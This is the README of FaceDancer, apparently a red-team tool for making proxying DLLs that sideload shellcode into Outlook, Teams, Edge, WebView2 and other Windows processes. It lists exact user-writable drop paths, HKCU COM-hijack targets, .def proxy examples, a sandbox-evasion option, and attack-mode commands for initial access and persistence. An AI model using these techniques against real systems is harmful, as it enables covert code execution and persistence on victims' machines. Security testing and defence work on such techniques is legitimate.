

<p align="center" height="310" border="2px solid #555">
<img src=Screenshots/FaceDancer_logo.png height="310" border="2px solid #555">
<br>
<strong style="font-size: large;">FaceDancer</strong>

</p>


## What is FaceDancer?

**FaceDancer is a security testing tool that helps identify and exploit vulnerabilities in how Windows applications load their components.** It allows penetration testers and red teamers to create specially crafted DLL files that can intercept and proxy legitimate application requests, enabling code execution for security assessments.

## Description
FaceDancer is an exploitation tool aimed at creating hijackable, proxy-based DLLs. FaceDancer performs two main functions:

* **Recon**: Scans a given DLL to create the export definition file for proxying.
* **Attack**: Creates a malicious DLL containing shellcode that can proxy valid function requests to the legitimate DLL.

FaceDancer contains numerous methods for performing DLL hijacking. These DLLs take advantage of either weak permissions on installation folders or COM-based system DLL image loading to load a malicious version of a legitimate DLL. Once loaded, the DLL executes the embedded shellcode while proxying valid requests for DLL functions to the legitimate DLL. This is accomplished by using a .def file to map valid requests to the correct DLL, which allows the malicious DLL to act as a "middleman" that executes code while still forwarding legitimate function calls. This bypasses application whitelisting controls as FaceDancer targets native processes needed for standard operation, making it effective for initial access or persistence.

### Important: Evasion Techniques

**FaceDancer contains zero built-in evasion techniques.** FaceDancer's purpose is to sideload malicious code into legitimate processes through DLL proxying. Since evasion techniques frequently change and vary depending on the environment, target, and current threat landscape, FaceDancer intentionally does not include any pre-baked evasion methods. This design allows you to deploy your own evasion techniques tailored to your specific situation and operational requirements.

**What are evasion techniques?** These are methods used to avoid detection by antivirus software and Endpoint Detection and Response (EDR) systems, such as:
- Process injection methods
- Anti-debugging checks
- Encrypted payloads
- Sleep/timing obfuscation
- Syscall direct invocation
- AMSI/ETW bypasses

**Why do you need them?** Without evasion techniques in your input DLL, security software will likely detect and block your payload immediately. It is critical that your input DLL contains all necessary evasion techniques appropriate for your target environment before using FaceDancer.

**For more information** about the techniques and how they are discovered, please see:
- **Blog Post**: [DLL Hijacking: A New Spin on Proxying Your Shellcode](https://www.blackhillsinfosec.com/dll-hijacking-a-new-spin-on-proxying-your-shellcode/)
- **Video Tutorial**: [FaceDancer Demo and Walkthrough](https://www.youtube.com/watch?v=1OzeSv9mUOk)



### Microsoft's Response
As of now, Microsoft has no plans to fix or remediate these issues but acknowledges them as valid vulnerabilities.

## Attack Methods

### DLL Based Proxy

At a high level, this involves exploiting DLLs that reside in folders that are not properly protected when installed, allowing an attacker to abuse the Load Image operation when the application is launched via DLL proxying. The overarching issue is that when Microsoft Teams is configured with an account, the application installs some additional plugins (including an Outlook plugin). Some of these plugins are installed in the user’s AppData folder with overly permissive permissions (i.e., write permission). Because of this, an attacker can rename a valid DLL in one of these directories that a process loads when it first launches and place their own malicious DLL in the same folder to have it automatically load and execute. This does not require admin privileges.

#### Example OneAuth.DLL

When Microsoft Teams v2 (aka Microsoft Teams for Work and School) is configured with a user’s profile, it installs a package called TeamsMeetingAddin into Outlook (if Outlook is installed). The folder containing the associated DLLs for this add-in can be modified by low-privilege users to both rename the legitimate DLLs and add malicious DLLs. This means the next time Outlook is launched, the malicious DLL is loaded by Outlook, leading to code execution as the Outlook process.


<p align="center">
<img src=Screenshots/OneAuth_ImageLoad.png border="2px solid #555">
<br>
</p>

All files in this directory can be modified by a low-privilege user.

<p align="center">
<img src=Screenshots/OneAuth_Permissions.png border="2px solid #555">
<br>
</p>

A DLL proxy attack is necessary to ensure that the original DLL is still loaded, preventing Outlook from crashing. The screenshot below demonstrates using this attack to execute arbitrary code, in this case, a Rust "Hello, World!" program, via Outlook.
<p align="center">
<img src=Screenshots/Hello_World.png border="2px solid #555">
<br>
</p>


### Proxying Function Requests
Using definition files (.def), which are text files containing one or more module statements that describe various attributes of a DLL, we can define all the exported functions and proxy them to the legitimate DLL that contains the requested functions. By using an export.def file, we can rename the legitimate DLL to whatever we want (e.g., a generic name like "Windows", "Excel", "Azure", etc. - avoiding suspicious patterns like "-old"), place our DLL in the same folder, and when a process loads it, our DLL will proxy any requests for one of the DLL's functions to the legitimate one. 

```
    EXPORTS
    ?IsZero@UUID@Authentication@Microsoft@@QEBA_NXZ=Azure.?IsZero@UUID@Authentication@Microsoft@@QEBA_NXZ @1
    GetLastOneAuthError=Azure.GetLastOneAuthError @2
    InitializeTelemetryCallbacks=Azure.InitializeTelemetryCallbacks @3
```

Because of this only one DLL is ever loaded (not OneAuth and its renamed copy) but when we look at the DLL's export functions we can see that each of the proxied functions call back to the renamed legitimate DLL (e.g., Azure.dll).

<p align="center">
<img src=Screenshots/Process_Running.png border="2px solid #555">
<br>
</p>

#### Microsoft Edge WebView2 Runtime

The **msedgewebview2.exe** process is part of the Microsoft Edge WebView2 Runtime, which is a lightweight version of the Edge browser engine used to render web content inside native Windows applications. WebView2 allows developers to embed web technologies (HTML, CSS, JavaScript) into desktop applications without launching a full browser. This is useful for:

* Displaying dynamic web content inside applications
* Reusing web-based UI components
* Ensuring consistent rendering across platforms

WebView2 uses the Chromium engine (same as Microsoft Edge) and follows a multi-process architecture for better performance, security, and reliability.

**Applications that commonly use WebView2 include:**
* Microsoft Teams
* Outlook (new version)
* Office applications
* Windows Widgets
* Visual Studio
* Windows Search

**The Security Vulnerability:**

While core Windows and Microsoft 365 applications depend on this process, **the WebView2 Runtime is susceptible to a DLL sideloading attack** by dropping the following DLLs from the user's `%LOCALAPPDATA%` directory:

**domain_actions.dll** can be placed in:
* **ms-teams.exe**: `%LOCALAPPDATA%\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\Domain Actions\3.0.0.16\domain_actions.dll`
* **olk.exe**: `%LOCALAPPDATA%\Microsoft\Olk\EBWebView\Domain Actions\3.0.0.16\domain_actions.dll`
* **Word.exe / Excel.exe**: `%LOCALAPPDATA%\Microsoft\Office\16.0\Wef\webview2\41f5eca4-3ef7-47f5-bb96-543406b9d7d7_ADAL\2\EBWebView\Domain Actions\3.0.0.16\domain_actions.dll`
* **M365Copilot.exe**: `%LOCALAPPDATA%\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\LocalState\EBWebView\Domain Actions\3.0.0.16\domain_actions.dll`
* **SearchApp.exe** *(harder to trigger)*: `%LOCALAPPDATA%\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView\Domain Actions\3.0.0.16\domain_actions.dll`
* **msedge.exe**: `%LOCALAPPDATA%\Microsoft\Edge\User Data\Domain Actions\3.0.0.16\domain_actions.dll`

**well_known_domains.dll** can be placed in:
* **msedge.exe**: `%LOCALAPPDATA%\Microsoft\Edge\User Data\Well Known Domains\1.2.0.0\well_known_domains.dll`

<p align="center">
<img src=Screenshots/msedgewebview2.png border="2px solid #555">
<br>
</p>

Because `%LOCALAPPDATA%` is a user-writable location, any non-administrative user can place files there. Applications load DLLs from this location without authenticating the DLL's source. An attacker can rename the original DLL and deploy a malicious proxy DLL that forwards valid requests to the renamed original, ensuring the process does not crash while executing the attacker's code.

This vulnerability exists despite Microsoft's WindowsApp security architecture (`C:\Program Files\WindowsApps\`), which was designed to prevent DLL sideloading through TrustedInstaller-only access and immutable binaries. While application executables remain protected in WindowsApp, **WebView2 undermines this model** by loading dependencies from user-controlled `%LOCALAPPDATA%` folders. Because WebView2 is used across Teams, Outlook, Office, Edge, Windows Search, and Widgets, a single sideloaded DLL achieves execution in multiple critical processes, making it effective for both initial access and persistence.

### The WindowsApp Security Model

Before discussing COM-based attacks, it's important to understand Microsoft's security measures for modern applications. Microsoft's **WindowsApp** folder architecture was specifically designed to prevent DLL sideloading attacks. Applications distributed through the Microsoft Store and modern Microsoft 365 applications (like the new Outlook and Teams) are installed in the `C:\Program Files\WindowsApps\` directory.

**Security Features of WindowsApp:**
* **TrustedInstaller Ownership**: Only the TrustedInstaller service account has write access
* **Administrator Lockout**: Even local administrators cannot directly access this folder without taking ownership
* **Immutable Binaries**: Application binaries cannot be modified or replaced
* **Restricted Permissions**: Standard users have no write access whatsoever

<p align="center">
<img src=Screenshots/WindowApps.png border="2px solid #555">
<br>
<em>WindowsApp folder blocks access even for Administrators</em>
</p>

This architecture effectively prevents traditional DLL sideloading attacks where an attacker places a malicious DLL alongside an executable. The folder's permissions make it essentially impossible for attackers to:
* Replace legitimate DLLs with malicious versions
* Add new DLLs to the application directory
* Modify existing application files

**Why This Matters**: Applications like Outlook (olk.exe), Teams (ms-teams.exe), and other modern Microsoft apps are specifically protected against local DLL replacement. This is a significant security improvement over legacy Win32 applications.

However, this protection has a critical weakness: **COM object loading**.

### COM-Based Proxying: Bypassing WindowsApp Protections

COM-based DLL proxying circumvents the WindowsApp security model by exploiting how Windows loads Component Object Model (COM) objects. Even though the application binaries are protected, their dependency resolution through the Windows registry is not.

**How the Attack Works:**

When applications start, they query the Windows registry for COM objects to find paths to system DLLs they need. The COM resolution follows this hierarchy:

1. **HKEY_CURRENT_USER (HKCU)** - Checked first
2. **HKEY_LOCAL_MACHINE (HKLM)** - Checked if HKCU fails

This is the vulnerability: processes check HKCU before HKLM, and low-privilege users have full write access to HKCU.

<p align="center">
<img src=Screenshots/Olk_Calling_Com.png border="2px solid #555">
<br>
</p>
<p align="center">
<img src=Screenshots/Com_Value.png border="2px solid #555">
<br>
</p>

By creating COM registry entries in HKCU with paths pointing to our malicious DLL, we can hijack the DLL loading process. Using the same proxy technique mentioned previously, we can:

1. Load our malicious DLL from anywhere on disk (e.g., user's temp folder)
2. Execute our payload
3. Proxy all legitimate function calls to the real system DLL in System32

This ensures there is no disruption to the application's operation. **This attack requires no privilege escalation or elevated permissions** - it works entirely within a standard user context.

<p align="center">
<img src=Screenshots/msedge.dll.png border="2px solid #555">
<br>
</p>
<p align="center">
<img src=Screenshots/Beacon.png border="2px solid #555">
<br>
</p>

**Effectiveness Against Protected Applications:**

This technique is particularly powerful against WindowsApp-protected applications. Even though we cannot modify files in `C:\Program Files\WindowsApps\`, we can control which DLLs they load by manipulating COM registration in the user's own registry hive.

Applications affected include:
* **Outlook** (olk.exe) - New Windows Store version
* **Microsoft Teams** (ms-teams.exe) 
* **Microsoft Edge** (msedge.exe)
* **Office Hub** and other modern Office applications

<p align="center">
<img src=Screenshots/Olk_Loading.png border="2px solid #555">
<br>
<em>Outlook loading COM object from user-controlled registry path</em>
</p>

The WindowsApp security model successfully prevents direct DLL replacement but cannot prevent COM hijacking because:
* Users must have write access to HKCU (it's their personal registry)
* The OS must check HKCU first for user-specific COM registrations (by design)
* Applications have no control over Windows' COM resolution order

This makes COM-based DLL proxying an effective technique for achieving persistence and code execution in modern, "secure-by-design" Microsoft applications.

## Installation

### Prerequisites

- **Rust and Cargo**: Version 1.70 or higher
  - Install from: **https://rustup.rs/**
- **Target Platform**: x86_64-pc-windows-gnu (for cross-compilation to Windows DLLs)

### Build Instructions

1. **Add Windows target** (Required for all platforms):
```bash
rustup target add x86_64-pc-windows-gnu
```
**Note**: This step is required even on Windows to ensure proper cross-compilation support.

2. **Install MinGW-w64** (Linux/macOS only):
```bash
# Ubuntu/Debian
sudo apt-get install mingw-w64

# Fedora
sudo dnf install mingw64-gcc

# macOS
brew install mingw-w64
```

3. **Build FaceDancer**:
```bash
git clone https://github.com/Tyl0us/FaceDancer.git
cd FaceDancer
cargo build --release
```

The compiled binary will be at `target/release/FaceDancer` (or `FaceDancer.exe` on Windows).

### Troubleshooting

Common errors and solutions:
- **"linker not found"**: Install MinGW-w64 toolchain
- **"target not found"**: Run `rustup target add x86_64-pc-windows-gnu`

---

# How To Use

## Quick Start Examples

### Example 1: Basic Recon - List DLL Exports
```bash
# View the exported functions from a DLL
FaceDancer recon -I <path-to-dll> -E
```

### Example 2: Generate Proxy Definition File
```bash
# Generate a .def file with automatic random word (default: word at front)
FaceDancer recon -I <path-to-dll> -G

# Generate with custom DLL name
FaceDancer recon -I <path-to-dll> -G -N CustomName

# Generate with word at end (e.g., target-Windows.dll)
FaceDancer recon -I <path-to-dll> -G -W
```

### Example 3: Create a Proxy DLL (Default Export)
```bash
# Create ffmpeg.dll proxy using DllMain as the export (default)
FaceDancer attack -D ffmpeg.dll -I payload.dll -O malicious.dll

# Same as above but with word at end
FaceDancer attack -D domain_actions.dll -I payload.dll -O malicious.dll -W
```

### Example 4: Create a Proxy DLL with Custom Export
```bash
# If your payload DLL exports a function called "MyCustomEntry" instead of DllMain
FaceDancer attack -D ffmpeg.dll -I payload.dll -O malicious.dll -X MyCustomEntry

# Same with sandbox evasion enabled
FaceDancer attack -D skypert.dll -I payload.dll -O malicious.dll -X MyCustomEntry -s
```

### Example 5: COM-Based Proxying
```bash
# Create a COM proxy DLL for Excel
FaceDancer attack -C fastprox.dll -I payload.dll -O malicious.dll
# Then add the registry keys shown in the output
```

### Example 6: Process-Specific Proxying
```bash
# Create a proxy that only executes in Outlook
FaceDancer attack -P Outlook -I payload.dll -O malicious.dll
# Then add the registry keys shown in the output
```

### Example 7: Custom .def File
```bash
# First, generate .def file from target DLL
FaceDancer recon -I <path-to-dll> -G

# Then use it to create proxy
FaceDancer attack -F target.def -I payload.dll -O malicious.dll
```

---

## Recon Mode

This mode allows FaceDancer to scan a specified DLL to generate the .def file for you. With this, you can then generate your own DLLs using FaceDancer rather than the pre-defined ones. 

When generating a .def file with `-G`, FaceDancer automatically generates a random word (like "Windows", "Excel", "Azure", etc.) and creates the export definitions using the format `{word}-{originalDLLName}`. This mimics the same naming convention used in attack mode, making it easier to prepare custom proxy DLLs. The generated word and renamed DLL name are printed to the screen so you know what to rename the original DLL to.

### Recon
```
    ___________                   ________                                    
    \_   _____/____    ____  ____ \______ \ _____    ____   ____  ___________ 
     |    __) \__  \ _/ ___\/ __ \ |    |  \\__  \  /    \_/ ___\/ __ \_  __ \
     |     \   / __ \\  \__\  ___/ |    `   \/ __ \|   |  \  \__\  ___/|  | \/
     \___  /  (____  /\___  >___  >_______  (____  /___|  /\___  >___  >__|   
         \/        \/     \/    \/        \/     \/     \/     \/    \/                                              
                                    (@Tyl0us)
                
Reconnaissance tools

Usage: FaceDancer recon [OPTIONS]

Options:
  -I, --Input <INPUT>       Path to the DLL to examine.
  -E, --exports             Displays the exported functions for the targeted DLL (only will show the first 20)
  -G, --generate            Generates the necessary .def for proxying
  -N, --dll-name <NAME>     Custom DLL name to use instead of the random word (e.g., 'Windows', 'Azure')
  -W, --word-at-end         Places the random word at the end of the DLL name 
                                             (e.g., OneAuth-Windows.dll instead of Windows-OneAuth.dll)
  -h, --help                Print help
```

## Attack Mode

This mode generates the actual DLLs used for proxying attacks. It works by taking an existing malicious DLL containing your shellcode and converting it into shellcode. Since FaceDancer does not contain any EDR evasion techniques, it is important that the inputted DLL includes all the necessary evasion techniques. This also means any type of DLL (not just Rust DLLs) can be used. Additionally, you can select the type of DLL attack you want to execute:
* `DLL` - Generates a DLL to be dropped into a specific folder. Depending on which DLL you generate, you need to navigate to a different directory. Once there, rename the original DLL, paste your DLL in that folder.
* `COM` - Generates a DLL along with the required registry entries to exploit it. With this type of DLL, any process that calls that COM object will load the DLL and execute the shellcode. For this to work, the provided registry keys need to be added to the HKCU section of the registry.
* `Process` -  Generates a DLL along with the required registry entries to exploit it. With this type of DLL, only when the specified process loads the DLL will the shellcode execute. For this to work, the provided registry keys need to be added to the HKCU section of the registry.
* `Custom` - Generates a DLL using a custom .def file. This allows you to create proxy DLLs for any target not in the predefined lists. Use `-F` to specify your .def file path.

### Additional Options

* **-W (word-at-end)**: By default, FaceDancer generates renamed DLLs with a format like `Windows-OneAuth.dll`. Using `-W` changes this to `OneAuth-Windows.dll`, placing the random word at the end instead of the beginning.

* **-X (Export)**: By default, FaceDancer uses `DllMain` as the export function to proxy from your input DLL. Use `-X` to specify a different export name if your malicious DLL uses a custom entry point.

* **-F (def file)**: For targeting DLLs not in the predefined lists, use the recon mode to generate a `.def` file for your target DLL, then use `-F` to specify that file when building.

### Attack

```
    ___________                   ________                                    
    \_   _____/____    ____  ____ \______ \ _____    ____   ____  ___________ 
     |    __) \__  \ _/ ___\/ __ \ |    |  \\__  \  /    \_/ ___\/ __ \_  __ \
     |     \   / __ \\  \__\  ___/ |    `   \/ __ \|   |  \  \__\  ___/|  | \/
     \___  /  (____  /\___  >___  >_______  (____  /___|  /\___  >___  >__|   
         \/        \/     \/    \/        \/     \/     \/     \/    \/                                              
                                    (@Tyl0us)
                
Attack tools

Usage: FaceDancer attack [OPTIONS]

Options:
  -O, --Output <OUTPUT>    Name of output DLL file.
  -I, --Input <INPUT>      Path to the 64-bit DLL.
  -D, --DLL <DLL>          The DLL to proxy: 
                                               [1] OneAuth.dll
                                               [2] ffmpeg.dll (warning can be unstable)
                                               [3] skypert.dll
                                               [4] SlimCV.dll
                                               [5] domain_actions.dll
                                               [6] well_known_domains.dll
  -C, --COM <COM>          The COM-DLL to proxy: 
                                               [1] ExplorerFrame.dll
                                               [2] fastprox.dll
                                               [3] mssprxy.dll
                                               [4] netprofm.dll
                                               [5] npmproxy.dll
                                               [6] OneCoreCommonProxyStub.dll
                                               [7] propsys.dll                                    
                                               [8] stobject.dll
                                               [9] wbemprox.dll
                                               [10] webplatstorageserver.dll
                                               [11] Windows.StateRepositoryPS.dll              
                                               [12] windows.storage.dll
                                               [13] wpnapps.dll
  -P, --PROCESS <PROCESS>  Process to proxy load into: 
                                               [1] Outlook
                                               [2] Excel
                                               [3] svchost
                                               [4] Explorer
                                               [5] sihost
                                               [6] msedge
                                               [7] OneDriveStandaloneUpdater                             
                                               [8] SSearchProtocolHost
                                               [9] Olk
                                               [10] Teams
                                               [11] Werfault            
                                               [12] Sdxhelper
                                               [13] AppHostRegistrationVerifier
                                               [14] rdpclip
                                               [15] Microsoft.SharePoint
                                               [16] MusNotificationUx
                                               [17] PhoneExperienceHost
                                               [18] taskhostw
                                               [19] DllHost      
                                                               
  -s, --sandbox            Enables sandbox evasion by checking:
                                               - Is Endpoint joined to a domain?
                                               - Is the file's name the same as its SHA256 value?
  -W, --word-at-end        Places the random word at the end of the DLL name 
                                               (e.g., OneAuth-Windows.dll instead of Windows-OneAuth.dll)
  -F, --def <PATH>         Path to the .def file used for custom export generation.
  -X, --Export <NAME>      Specify a single export name to proxy (defaults to DllMain).
  -h, --help               Print help

```


## Help

```


    ___________                   ________                                    
    \_   _____/____    ____  ____ \______ \ _____    ____   ____  ___________ 
     |    __) \__  \ _/ ___\/ __ \ |    |  \\__  \  /    \_/ ___\/ __ \_  __ \
     |     \   / __ \\  \__\  ___/ |    `   \/ __ \|   |  \  \__\  ___/|  | \/
     \___  /  (____  /\___  >_______  (____  /___|  /\___  >___  >__|   
         \/        \/     \/    \/        \/     \/     \/     \/    \/                                              
                                    (@Tyl0us)
                
Does awesome things

Usage: FaceDancer [COMMAND]

Commands:
  recon   Reconnaissance tools
  attack  Attack tools
  help    Print this message or the help of the given subcommand(s)

Options:
  -h, --help     Print help
  -V, --version  Print version
```

---

### Credit
Special thanks to Teach2Breach for developing [dll2shell](https://github.com/Teach2Breach/dll2shell/tree/main)
